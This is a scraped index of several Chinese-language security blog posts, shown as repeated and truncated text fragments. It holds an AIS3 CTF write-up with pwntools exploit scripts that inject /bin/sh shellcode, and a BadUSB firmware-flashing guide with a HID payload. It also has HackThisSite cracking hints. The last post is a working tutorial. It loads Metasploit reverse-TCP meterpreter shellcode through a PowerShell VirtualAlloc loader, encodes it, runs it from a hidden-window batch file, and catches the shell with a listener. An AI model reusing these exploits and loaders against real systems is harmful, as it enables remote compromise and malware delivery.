pwn import * import time r = remote(\u0026#39;127.0.0.1\u0026#39;, 4000) read_adr = \u0026#34;\\xa0\\x83\\x04\\x08\u0026#34; read = \u0026#34;\\x00\\x00\\x00\\x00\u0026#34; + \u0026#34;\\x00\\xa1\\x04\\x08\u0026#34; + \u0026#34;\\x00\\x01\\x00\\x00\u0026#34; p = \u0026#34;a\u0026#34;*20 + read_adr + \u0026#34;\\x00\\xa1\\x04\\x08\u0026#34; + read r.send (p) time.sleep(5) r.send (\u0026#34;\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd \\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\u0026#34;) PWN3 滿多東西始用 qira看的 pwn3首先可以一直push來達成覆蓋ret的效果最後要exit退出達成覆蓋 一開始算一下 pop leak 的值跟我們shellcode 差多遠,計算以後差 36 ,但是會覆蓋 ret 所以ret 以後要給他一個指標 指向我們的shellcode ⽤用%d的話超過0x80000000 要剪掉 0x100000000塞進去的職才會是正常的 我們的payload預計長這樣\npoint to shellcode + shellcode + nop + ret from pwn import * import time r = remote(\u0026#39;127.0.0.1\u0026#39;,4000) def push(num): r.send(\u0026#39;1\\n\u0026#39;) time.sleep(0.2) if num \u0026gt; 0x80000000: num -= 0x100000000 r.send( str(num) + \u0026#39;\\n\u0026#39;) #pop leak r.send(\u0026#39;2\\n\u0026#39;) item = r.recvline_contains(\u0026#39;item\u0026#39;)[13:23] shell_adr = int(item,16) - 36 + 4 #shellcode point push(shell_adr) #shellcode push(0x315b0beb) push(0x31c931c0) push(0xcd0bb0d2) push(0xfff0e880) push(0x622fffff) push(0x732f6e69) push(0x90900068) #nop for _ in range (0,16): push(0x90909090) #ret push(shell_adr) #exit time.sleep(1) r.send(\u0026#39;4\\n\u0026#39;) #get shell r.interactive() ","permalink":"https://blog.zet.tw/posts/2015-11-24-ais3-pwn/","summary":"簡單紀錄一下\nPWN1 丟進ida 可以看到\nif ( v4 == 0x90909090 ) result = puts(aCensordCensord); else result = printf(\u0026#34;Your point is only %d, try hard!\\n\u0026#34;, v4, v1, v2, v3); return result; 直接塞90結束\npython -c \u0026#39;print \u0026#34;\\x90\u0026#34;*1000\u0026#39; | nc 52.69.163.194 1111 PWN2 定位到地20個字以後可以控制eip\ngdb-peda$ info functions All defined functions: Non-debugging symbols: 0x08048364 _init 0x080483a0 read@plt 可以指到read上,一般來說長這樣\ncall ret argv1 ￼argv2 argv3 可以控制read的返回地址跟參數,所以可以把ret跟我們shellcode 指到同一個位置上,shellcode的話隨便找一段空⽩白的地⽅方寫上去就好\nfrom pwn import * import time r = remote(\u0026#39;127.0.0.1\u0026#39;, 4000) read_adr = \u0026#34;\\xa0\\x83\\x04\\x08\u0026#34; read = \u0026#34;\\x00\\x00\\x00\\x00\u0026#34; + \u0026#34;\\x00\\xa1\\x04\\x08\u0026#34; + \u0026#34;\\x00\\x01\\x00\\x00\u0026#34; p = \u0026#34;a\u0026#34;*20 + read_adr + \u0026#34;\\x00\\xa1\\x04\\x08\u0026#34; + read r.","title":"AIS3 PWN"},{"content":"https://slides.com/zettain/bad-usb\nhttps://github.com/adamcaudill/Psychson\n支援設備  Patriot 8GB Supersonic Xpress* Kingston DataTraveler 3.0 T111 8GB Silicon power marvel M60 64GB Patriot Stellar 64 Gb Phison Toshiba TransMemory-MX USB 3.0 16GB Toshiba TransMemory-MX USB 3.0 8GB Kingston DataTraveler G4 64 GB Patriot PSF16GXPUSB Supersonic Xpress 16GB Silicon Power 32GB Blaze B30 (SP032GBUF3B30V1K) Kingston Digital 8GB USB 3.0 DataTraveler  取得晶片 型號 下載 Firmware 與 燒錄檔案\nFirmware PS2251-03 flash chip\nhttp://www.usbdev.ru/?wpfb_dl=777\n編譯環境 Visual Studio 2012\nSDCC (Small Device C Compiler 安裝路徑 C:\\Program Files\\SDCC 可以先編譯 DriveCom 和 Injector\n可以插入 usb 用 DriveCom 看看有沒有東西 tools\\DriveCom.exe /drive=D /action=GetInfo\nDumpFirmware DriveCom.exe /drive=E /action=DumpFirmware /firmware=[firmware]\nFlashing Custom Firmware 確認在BootMode\ntools\\DriveCom.exe /drive=E /action=SetBootMode tools\\DriveCom.exe /drive=D /action=SendExecutable /burner=[burner.bin] tools\\DriveCom.exe /drive=D /action=SendFirmware /burner=[burner.bin] /firmware=[firmware] HID Payload 下載 https://code.google.com/p/ducky-decode/\n先把 payload.txt 轉成 .bin\n需安裝Java Runtime Environment\njava -jar encoder.jar -i payload.txt -o inject.bin\n生成 inject.bin 以後還需要一個客製化的 Firmware，去 Psychson-master\\firmware build bin資料夾裡面有 fw.bin 複製出來\n把 inject.bin 注入到 fw.bin\ntools\\EmbedPayload.exe inject.bin fw.bin tools\\DriveCom.exe /drive=D /action=SetBootMode tools\\DriveCom.exe /drive=D /action=SendExecutable /burner=bn.bin tools\\DriveCom.exe /drive=D /action=SendFirmware /burner=bn.bin /firmware=fw.bin 如何重刷Firmware與恢復原本可以用的USB 重刷必須進入BootMode但是有時無法用指令的方式進入，所以必須用短路法參考竹中的腳位，拿單心線或是小剪刀之類的放在上面再插進去usb\nPsychson-master\\docs\\PinsToShortUponPlugInForBootMode.jpg\n變回原本USB可以用MPALL v3.71.0A_03 MLC(UP03 64pin)\nhttp://www.usbdev.ru/?wpfb_dl=4388\n","permalink":"https://blog.zet.tw/posts/2015-04-12-badusb/","summary":"https://slides.com/zettain/bad-usb\nhttps://github.com/adamcaudill/Psychson\n支援設備  Patriot 8GB Supersonic Xpress* Kingston DataTraveler 3.0 T111 8GB Silicon power marvel M60 64GB Patriot Stellar 64 Gb Phison Toshiba TransMemory-MX USB 3.0 16GB Toshiba TransMemory-MX USB 3.0 8GB Kingston DataTraveler G4 64 GB Patriot PSF16GXPUSB Supersonic Xpress 16GB Silicon Power 32GB Blaze B30 (SP032GBUF3B30V1K) Kingston Digital 8GB USB 3.0 DataTraveler  取得晶片 型號 下載 Firmware 與 燒錄檔案\nFirmware PS2251-03 flash chip\nhttp://www.usbdev.ru/?wpfb_dl=777\n編譯環境 Visual Studio 2012","title":"Badusb"},{"content":"app1 Hint:HEX\napp2 Hint:HEX\napp4 Hint:VB反編譯，OD修改 Hint:OD窗口插件\napp5 Hint:觀察ebp附近也存在答案\n0040109C 8B4D E0 mov ecx,dword ptr ss:[ebp-20] ; 算法開始 0040109F 83C1 04 add ecx,4 004010A2 894D E0 mov dword ptr ss:[ebp-20],ecx 004010A5 8B55 DC mov edx,dword ptr ss:[ebp-24] 004010A8 83EA 01 sub edx,1 004010AB 8955 DC mov dword ptr ss:[ebp-24],edx 004010AE 837D E0 0D cmp dword ptr ss:[ebp-20],0D 004010B2 73 28 jnb short app5win.004010DC 004010B4 8B45 E0 mov eax,dword ptr ss:[ebp-20] 004010B7 C1E8 02 shr eax,2 004010BA 8B4D F8 mov ecx,dword ptr ss:[ebp-8] 004010BD 8B55 DC mov edx,dword ptr ss:[ebp-24] 004010C0 8B0481 mov eax,dword ptr ds:[ecx+eax*4] 004010C3 3B4495 E8 cmp eax,dword ptr ss:[ebp+edx*4-18] ; 比較ascii,注意堆棧 004010C7 74 11 je short app5win.004010DA 004010C9 68 4C704000 push app5win.0040704C ; invalid password 004010CE E8 20000000 call app5win.004010F3 004010D3 83C4 04 add esp,4 004010D6 33C0 xor eax,eax 004010D8 EB 15 jmp short app5win.004010EF 004010DA ^ EB C0 jmp short app5win.0040109C ; loop跳回 004010DC 8D4D CC lea ecx,dword ptr ss:[ebp-34] 004010DF 51 push ecx 004010E0 68 60704000 push app5win.00407060 ; the password is %s\\n app6 Hint:同app5\napp7 http://zqyves.blogspot.tw/2008/05/hackthissite-application-7-solution.html\napp8 Hint: bp __vbaVarTstEq\napp9 Hint:100,500,1000\napp10 Hint: VB Decompile ，click\napp11 Hint: 讓視窗變長巴\napp12 Hint: bp __vbaVarTstEq\n","permalink":"https://blog.zet.tw/posts/2013-07-23-hackthissite-application-missions/","summary":"app1 Hint:HEX\napp2 Hint:HEX\napp4 Hint:VB反編譯，OD修改 Hint:OD窗口插件\napp5 Hint:觀察ebp附近也存在答案\n0040109C 8B4D E0 mov ecx,dword ptr ss:[ebp-20] ; 算法開始 0040109F 83C1 04 add ecx,4 004010A2 894D E0 mov dword ptr ss:[ebp-20],ecx 004010A5 8B55 DC mov edx,dword ptr ss:[ebp-24] 004010A8 83EA 01 sub edx,1 004010AB 8955 DC mov dword ptr ss:[ebp-24],edx 004010AE 837D E0 0D cmp dword ptr ss:[ebp-20],0D 004010B2 73 28 jnb short app5win.004010DC 004010B4 8B45 E0 mov eax,dword ptr ss:[ebp-20] 004010B7 C1E8 02 shr eax,2 004010BA 8B4D F8 mov ecx,dword ptr ss:[ebp-8] 004010BD 8B55 DC mov edx,dword ptr ss:[ebp-24] 004010C0 8B0481 mov eax,dword ptr ds:[ecx+eax*4] 004010C3 3B4495 E8 cmp eax,dword ptr ss:[ebp+edx*4-18] ; 比較ascii,注意堆棧 004010C7 74 11 je short app5win.","title":"HackThisSite Application Missions"},{"content":"執行shellcode的模板\n$code = \u0026#39;[DllImport(\u0026#34;kernel32.dll\u0026#34;)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\u0026#34;kernel32.dll\u0026#34;)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\u0026#34;msvcrt.dll\u0026#34;)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);\u0026#39;;$winFunc = Add-Type -memberDefinition $code -Name \u0026#34;Win32\u0026#34; -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = SHELLCOD;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 }; SHELLCOD的地方是要替換的\n我們用msf生成我們的shellcode\nmsfpayload windows/x64/meterpreter/reverse_tcp LHOST=192.168.152.146 LPORT=443 C | more 查看一下\n/* * windows/x64/meterpreter/reverse_tcp - 422 bytes (stage 1) * http://www.metasploit.com * VERBOSE=false, LHOST=192.168.152.146, LPORT=443, * ReverseConnectRetries=5, ReverseAllowProxy=false, * EXITFUNC=process, AutoLoadStdapi=true, * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, * EnableUnicodeEncoding=true */ unsigned char buf[] = \u0026#34;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\u0026#34; \u0026#34;\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\u0026#34; \u0026#34;\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\u0026#34; \u0026#34;\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\u0026#34; \u0026#34;\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\u0026#34; \u0026#34;\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\u0026#34; \u0026#34;\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\u0026#34; \u0026#34;\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\u0026#34; \u0026#34;\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\u0026#34; \u0026#34;\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\u0026#34; \u0026#34;\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\u0026#34; \u0026#34;\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\u0026#34; \u0026#34;\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\u0026#34; \u0026#34;\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\u0026#34; \u0026#34;\\x32\\x00\\x00\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\u0026#34; \u0026#34;\\x49\\x89\\xe5\\x49\\xbc\\x02\\x00\\x01\\xbb\\xc0\\xa8\\x98\\x92\\x41\\x54\u0026#34; \u0026#34;\\x49\\x89\\xe4\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\u0026#34; \u0026#34;\\x89\\xea\\x68\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\\x00\\xff\u0026#34; \u0026#34;\\xd5\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89\\xc2\u0026#34; \u0026#34;\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x48\u0026#34; \u0026#34;\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba\\x99\u0026#34; \u0026#34;\\xa5\\x74\\x61\\xff\\xd5\\x48\\x81\\xc4\\x40\\x02\\x00\\x00\\x48\\x83\\xec\u0026#34; \u0026#34;\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9\\x6a\\x04\\x41\\x58\\x48\\x89\\xf9\\x41\u0026#34; \u0026#34;\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x48\\x83\\xc4\\x20\\x5e\\x6a\\x40\\x41\u0026#34; \u0026#34;\\x59\\x68\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41\u0026#34; \u0026#34;\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31\u0026#34; \u0026#34;\\xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\u0026#34; \u0026#34;\\x5f\\xff\\xd5\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\\x85\\xf6\\x75\\xe1\\x41\u0026#34; \u0026#34;\\xff\\xe7\u0026#34;; /* * windows/x64/meterpreter/reverse_tcp - 951296 bytes (stage 2) * http://www.metasploit.com */ unsigned char buf[] = \u0026#34;\\x4d\\x5a\\x41\\x52\\x55\\x48\\x89\\xe5\\x48\\x81\\xec\\x20\\x00\\x00\\x00\u0026#34; \u0026#34;\\x48\\x8d\\x1d\\xea\\xff\\xff\\xff\\x48\\x81\\xc3\\xf0\\x1b\\x00\\x00\\xff\u0026#34; \u0026#34;\\xd3\\x48\\x89\\xc3\\x49\\x89\\xf8\\x68\\x04\\x00\\x00\\x00\\x5a\\xff\\xd0\u0026#34; \u0026#34;\\x41\\xb8\\xf0\\xb5\\xa2\\x56\\x68\\x05\\x00\\x00\\x00\\x5a\\xff\\xd3\\x00\u0026#34; 必需處理一下變成我們需要的格式\nmsfpayload windows/x64/meterpreter/reverse_tcp LHOST=192.168.152.146 LPORT=443 C | sed -n -e \u0026#39;1,40p\u0026#39; | sed \u0026#39;s/[\u0026#34;;]//g\u0026#39; | sed \u0026#39;s/\\\\/,0/g\u0026#39; | tr -d \u0026#39;\\n\u0026#39; 使用sed來處理，紅色40是行數，假如shellcode較長看有幾行自行調整 處理以後的格式\n0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,0xc0,0xa8,0x98,0x92,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x48,0x83,0xc4,0x20,0x5e,0x6a,0x40,0x41,0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xe1,0x41,0xff,0xe7 貼上我們的模板 在使用加密腳本加密一下\n./ps_encoder.py -s 111 下載地址 https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py\n加密以後 建立一個bat檔 powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand \u0026lt;加密後的字串\u0026gt;\n使用MSF監聽\nuse multi/handler set payload windows/x64/meterpreter/reverse_tcp set lport 443 set LHOST 0.0.0.0 exploit 之後執行bat檔就可以看到MSF有反應了 youtube: http://www.youtube.com/watch?v=oLKTo8dew_o\n","permalink":"https://blog.zet.tw/posts/2013-03-18-pwershell-lunch-shellcode/","summary":"執行shellcode的模板\n$code = \u0026#39;[DllImport(\u0026#34;kernel32.dll\u0026#34;)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\u0026#34;kernel32.dll\u0026#34;)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\u0026#34;msvcrt.dll\u0026#34;)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);\u0026#39;;$winFunc = Add-Type -memberDefinition $code -Name \u0026#34;Win32\u0026#34; -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = SHELLCOD;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 }; SHELLCOD的地方是要替換的","title":"Use powershell lunch shellcode"}]